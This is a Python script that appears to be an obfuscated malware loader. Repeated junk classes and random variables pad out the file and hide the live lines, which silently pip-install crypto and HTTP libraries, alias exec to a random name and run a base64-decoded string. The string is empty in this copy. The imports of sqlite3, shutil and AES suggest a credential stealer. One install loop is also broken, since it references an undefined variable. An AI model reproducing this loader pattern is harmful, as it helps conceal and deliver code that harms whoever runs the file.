

from sys import executable, stderr
class t36iDMVL0o:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
lb8Rhil6As = 38131235
class WPVixSeseR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ucz1iNW7p3 = 14297121
piVVQ9zHx3 = 88025751
class Q7ZZdIStR5:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class tdQ4XRuIDb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
BwRekMLyCK = 10067252
class bVTcjEH1yW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
PAQHCbx8Kg = 97369569
zMMmQ817pR = 88212859
class TkQq1EEBuY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class SUOi7yatuk:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
F88tLk7p0r = 68807665
class pmD59SQgu2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
hNj1Ahf9IO = 98582165
sgJIeffCvv = 25964263
h2xNaLptkZ = 81681527
class ZopT2FYimo:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'YGVclBcqtg'"]
class ndfjwiZrg0:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'Yf3woT9V3h'
{'username': 'NX8hHz6', 'age': 26}
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
class t36iDMVL0o:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
lb8Rhil6As = 38131235
class WPVixSeseR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ucz1iNW7p3 = 14297121
piVVQ9zHx3 = 88025751
class Q7ZZdIStR5:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class tdQ4XRuIDb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
BwRekMLyCK = 10067252
class bVTcjEH1yW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
PAQHCbx8Kg = 97369569
zMMmQ817pR = 88212859
class TkQq1EEBuY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class SUOi7yatuk:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
F88tLk7p0r = 68807665
class pmD59SQgu2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
hNj1Ahf9IO = 98582165
sgJIeffCvv = 25964263
h2xNaLptkZ = 81681527
class ZopT2FYimo:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'YGVclBcqtg'"]
class ndfjwiZrg0:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'Yf3woT9V3h'
{'username': 'NX8hHz6', 'age': 26}
jNdvNeJxdlo1HZNfBmLMZMGmOSQbKBLGz7xafD = exec
class t36iDMVL0o:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
lb8Rhil6As = 38131235
class WPVixSeseR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ucz1iNW7p3 = 14297121
piVVQ9zHx3 = 88025751
class Q7ZZdIStR5:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class tdQ4XRuIDb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
BwRekMLyCK = 10067252
class bVTcjEH1yW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
PAQHCbx8Kg = 97369569
zMMmQ817pR = 88212859
class TkQq1EEBuY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class SUOi7yatuk:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
F88tLk7p0r = 68807665
class pmD59SQgu2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
hNj1Ahf9IO = 98582165
sgJIeffCvv = 25964263
h2xNaLptkZ = 81681527
class ZopT2FYimo:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'YGVclBcqtg'"]
class ndfjwiZrg0:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'Yf3woT9V3h'
{'username': 'NX8hHz6', 'age': 26}
import concurrent.futures
lWImGMQcBudeFghsPitRnQR4BUWStKisuWxyQf=""
jNdvNeJxdlo1HZNfBmLMZMGmOSQbKBLGz7xafD(base64.b64decode(lWImGMQcBudeFghsPitRnQR4BUWStKisuWxyQf))
class t36iDMVL0o:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
lb8Rhil6As = 38131235
class WPVixSeseR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ucz1iNW7p3 = 14297121
piVVQ9zHx3 = 88025751
class Q7ZZdIStR5:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class tdQ4XRuIDb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
BwRekMLyCK = 10067252
class bVTcjEH1yW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
PAQHCbx8Kg = 97369569
zMMmQ817pR = 88212859
class TkQq1EEBuY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class SUOi7yatuk:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
F88tLk7p0r = 68807665
class pmD59SQgu2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
hNj1Ahf9IO = 98582165
sgJIeffCvv = 25964263
h2xNaLptkZ = 81681527
class ZopT2FYimo:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'YGVclBcqtg'"]
class ndfjwiZrg0:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'Yf3woT9V3h'
{'username': 'NX8hHz6', 'age': 26}